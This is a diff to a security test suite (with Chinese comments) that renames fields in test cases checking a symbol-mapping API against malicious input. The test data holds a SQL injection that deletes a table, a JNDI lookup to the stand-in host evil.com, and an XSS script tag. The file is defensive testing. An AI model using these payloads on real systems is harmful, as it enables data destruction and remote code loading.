@@ -318,18 +318,18 @@ describe("Core Data Security Tests", () => {
     it("应该防护符号映射规则注入", async () => {
       const maliciousRules = [
         {
-          inputSymbol: 'AAPL"; DELETE FROM symbol_mappings; --',
-          outputSymbol: "AAPL.US",
+          standardSymbol: 'AAPL"; DELETE FROM symbol_mappings; --',
+          sdkSymbol: "AAPL.US",
           market: "US",
         },
         {
-          inputSymbol: "AAPL",
-          outputSymbol: "AAPL.US",
+          standardSymbol: "AAPL",
+          sdkSymbol: "AAPL.US",
           market: "${jndi:ldap://evil.com/a}", // JNDI injection
         },
         {
-          inputSymbol: '<script>alert("XSS")</script>',
-          outputSymbol: "AAPL.US",
+          standardSymbol: '<script>alert("XSS")</script>',
+          sdkSymbol: "AAPL.US",
           market: "US",
         },
       ];
@@ -341,7 +341,7 @@ describe("Core Data Security Tests", () => {
           .set("X-Access-Token", validApiKey.accessToken)
           .send({
             provider: "test",
-            symbols: [rule.inputSymbol],
+            symbols: [rule.standardSymbol],
           });
 
         // 应该安全处理恶意符号
